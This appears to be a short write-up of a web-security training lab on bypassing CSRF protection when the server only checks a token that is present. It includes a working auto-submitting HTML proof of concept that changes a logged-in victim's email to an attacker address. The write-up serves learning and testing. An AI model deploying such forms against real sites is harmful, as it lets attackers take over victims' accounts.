# Practitioner Lab 79 : CSRF where token validation depends on token being present

---

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

I first start by looking around the website to see its functionality.

I first try to take out the CSRF from the request to see if it would give me any type of error.

![Untitled](Practitioner%20Lab%2079%20CSRF%20where%20token%20validation%20de%20b96f82aeaddf4d1a8670bcd5bb09c44a/Untitled.png)

This worked showing that I can sometimes take out the complete parameter and it might still work. One should always test by taking out the parameter as well as trying different methods. 

```
<html>
  <body>
    <form action="https://0a9a00cd037eb89c80d92be7004600ce.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evilpayload&#64;evil&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![Untitled](Practitioner%20Lab%2079%20CSRF%20where%20token%20validation%20de%20b96f82aeaddf4d1a8670bcd5bb09c44a/Untitled%201.png)